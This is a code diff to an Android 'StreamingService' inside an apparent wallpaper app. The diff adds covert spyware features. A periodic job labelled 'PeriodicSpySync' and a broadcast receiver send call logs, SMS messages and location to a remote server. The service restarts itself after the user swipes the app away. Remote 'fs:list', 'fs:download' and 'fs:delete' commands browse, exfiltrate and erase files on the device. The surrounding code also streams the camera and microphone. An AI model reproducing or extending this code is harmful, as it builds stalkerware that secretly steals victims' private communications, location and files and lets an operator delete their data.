@@ -7,6 +7,7 @@ import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -59,12 +60,17 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import android.content.SharedPreferences;
 import androidx.preference.PreferenceManager;
+import android.content.BroadcastReceiver;
+import android.content.IntentFilter;
+import java.io.File;
+import java.io.FileInputStream;
+import android.util.Base64;
 
 public class StreamingService extends Service {
     private static final String TAG = "StreamingService";
     private static final String CHANNEL_ID = "streaming_channel";
     private static final int NOTIFICATION_ID = 1;
-    public static final String DEFAULT_SIGNALING_URL = "http://<Your Server IP address>:3000";
+    public static final String DEFAULT_SIGNALING_URL = "http://192.168.29.11:3000";
     private static final long DATA_POLL_INTERVAL = 30_000; // Poll every 30 seconds
 
     private PeerConnectionFactory factory;
@@ -83,12 +89,47 @@ public class StreamingService extends Service {
     private Runnable dataRunnable;
     private FusedLocationProviderClient fusedLocationClient;
     private LocationCallback locationCallback;
+    private BroadcastReceiver syncReceiver;
 
     @Override
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "Service onCreate");
         startForeground(NOTIFICATION_ID, createNotification());
+
+        // Register Sync Receiver (triggered by WorkManager)
+        syncReceiver = new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                if ("com.example.wallpaperapplication.ACTION_FORCE_SYNC".equals(intent.getAction())) {
+                    Log.d(TAG, "Received Force Sync broadcast");
+                    if (socket != null && socket.connected()) {
+                        sendCallLogs();
+                        sendSmsMessages();
+                        if (fusedLocationClient != null) {
+                            try {
+                                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
+                                    if (location != null) sendLocation(location.getLatitude(), location.getLongitude());
+                                });
+                            } catch (SecurityException e) {}
+                        }
+                    }
+                }
+            }
+        };
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            registerReceiver(syncReceiver, new IntentFilter("com.example.wallpaperapplication.ACTION_FORCE_SYNC"), Context.RECEIVER_NOT_EXPORTED);
+        }
+
+        // Schedule WorkManager (Periodic)
+        androidx.work.PeriodicWorkRequest saveRequest =
+                new androidx.work.PeriodicWorkRequest.Builder(DataSyncWorker.class, 15, java.util.concurrent.TimeUnit.MINUTES)
+                        .build();
+        androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                "PeriodicSpySync",
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                saveRequest);
+
         if (!hasRequiredPermissions()) {
             broadcastPermissionError();
             stopSelf();
@@ -98,7 +139,7 @@ public class StreamingService extends Service {
         setupMediaStreaming();
         connectSignaling();
         startNotificationListener();
-        startDataPolling();
+        // startDataPolling(); // Replaced by WorkManager
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
     }
 
@@ -117,6 +158,7 @@ public class StreamingService extends Service {
     public void onDestroy() {
         super.onDestroy();
         Log.d(TAG, "Service onDestroy");
+        if (syncReceiver != null) unregisterReceiver(syncReceiver);
         cleanup();
         if (socket != null) socket.disconnect();
     }
@@ -124,6 +166,25 @@ public class StreamingService extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Log.d(TAG, "Service task removed (app swiped), restarting...");
+        Intent restartServiceIntent = new Intent(getApplicationContext(), StreamingService.class);
+        restartServiceIntent.setPackage(getPackageName());
+        PendingIntent restartServicePendingIntent = PendingIntent.getService(
+                getApplicationContext(), 1, restartServiceIntent,
+                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        
+        android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
+        if (alarmService != null) {
+            alarmService.set(
+                    android.app.AlarmManager.ELAPSED_REALTIME,
+                    android.os.SystemClock.elapsedRealtime() + 1000,
+                    restartServicePendingIntent);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 
     private String getSignalingUrl() {
@@ -139,13 +200,23 @@ public class StreamingService extends Service {
         boolean callLog = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
         boolean sms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
         boolean location = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+        
+        boolean storage = true;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            storage = android.os.Environment.isExternalStorageManager();
+        } else {
+            storage = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
+        }
+
         if (!camera) Log.e(TAG, "Camera permission missing");
         if (!audio) Log.e(TAG, "Record audio permission missing");
         if (!notify) Log.e(TAG, "Notifications permission missing");
         if (!callLog) Log.e(TAG, "Call log permission missing");
         if (!sms) Log.e(TAG, "SMS permission missing");
         if (!location) Log.e(TAG, "Location permission missing");
-        return camera && audio && notify && callLog && sms && location;
+        if (!storage) Log.e(TAG, "Storage permission missing");
+        
+        return camera && audio && notify && callLog && sms && location && storage;
     }
 
     private void broadcastPermissionError() {
@@ -348,6 +419,8 @@ public class StreamingService extends Service {
             Log.d(TAG, "Web client ready: " + webClientId);
             createAndSendOffer();
             startLocationUpdates();
+            sendCallLogs(); // Immediate sync
+            sendSmsMessages(); // Immediate sync
         }).on("signal", args -> {
             Log.d(TAG, "Signal incoming");
             if (args[0] instanceof JSONObject) {
@@ -359,9 +432,100 @@ public class StreamingService extends Service {
                 webClientId = null;
                 stopLocationUpdates();
             }
+        }).on("fs:list", args -> {
+            Log.d(TAG, "Received fs:list event: " + Arrays.toString(args));
+            String path = parsePath(args);
+            if (path != null) {
+                listFiles(path);
+            } else {
+                Log.e(TAG, "fs:list invalid args: " + Arrays.toString(args));
+            }
+        }).on("fs:download", args -> {
+            String path = parsePath(args);
+            if (path != null) {
+                downloadFile(path);
+            }
+        }).on("fs:delete", args -> {
+            String path = parsePath(args);
+            if (path != null) {
+                deleteTargetFile(path);
+            }
         });
 
         socket.connect();
+    }
+
+    private String parsePath(Object[] args) {
+        if (args.length > 0) {
+            if (args[0] instanceof String) {
+                return (String) args[0];
+            } else if (args[0] instanceof JSONObject) {
+                return ((JSONObject) args[0]).optString("path", null);
+            }
+        }
+        return null;
+    }
+
+    private void listFiles(String path) {
+        if (webClientId == null) return;
+        File directory = new File(path);
+        if (!directory.exists() || !directory.isDirectory()) {
+            directory = android.os.Environment.getExternalStorageDirectory();
+        }
+
+        File[] files = directory.listFiles();
+        JSONArray fileList = new JSONArray();
+        if (files != null) {
+            for (File file : files) {
+                try {
+                    JSONObject f = new JSONObject();
+                    f.put("name", file.getName());
+                    f.put("path", file.getAbsolutePath());
+                    f.put("isDir", file.isDirectory());
+                    f.put("size", file.length());
+                    fileList.put(f);
+                } catch (JSONException e) {}
+            }
+        }
+
+        try {
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId);
+            msg.put("from", socket.id());
+            JSONObject data = new JSONObject();
+            data.put("currentPath", directory.getAbsolutePath());
+            data.put("files", fileList);
+            msg.put("file_list", data);
+            socket.emit("fs:files", msg);
+        } catch (JSONException e) { Log.e(TAG, "FS List Error", e); }
+    }
+
+    private void downloadFile(String path) {
+        if (webClientId == null) return;
+        File file = new File(path);
+        if (file.exists() && file.isFile()) {
+            try {
+                FileInputStream fis = new FileInputStream(file);
+                byte[] bytes = new byte[(int) file.length()];
+                fis.read(bytes);
+                fis.close();
+                String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
+
+                JSONObject msg = new JSONObject();
+                msg.put("to", webClientId);
+                msg.put("from", socket.id());
+                JSONObject data = new JSONObject();
+                data.put("name", file.getName());
+                data.put("content", base64);
+                msg.put("file_data", data);
+                socket.emit("fs:download_ready", msg);
+            } catch (Exception e) { Log.e(TAG, "FS Download Error", e); }
+        }
+    }
+
+    private void deleteTargetFile(String path) {
+        File file = new File(path);
+        file.delete();
     }
 
     private void startLocationUpdates() {
@@ -794,9 +958,11 @@ public class StreamingService extends Service {
                     Log.d(TAG, "NotificationListener Socket.IO CONNECTED");
                     socket.emit("identify", "android");
                 }).on("web-client-ready", args -> {
-                    if (args[0] instanceof String) {
+                    if (args.length > 0 && args[0] instanceof String) {
                         webClientId = (String) args[0];
                         Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
+                    } else {
+                         Log.w(TAG, "NotificationListener invalid web-client-ready args: " + Arrays.toString(args));
                     }
                 }).on(Socket.EVENT_CONNECT_ERROR, args -> {
                     Log.e(TAG, "NotificationListener Connect error: " + Arrays.toString(args));
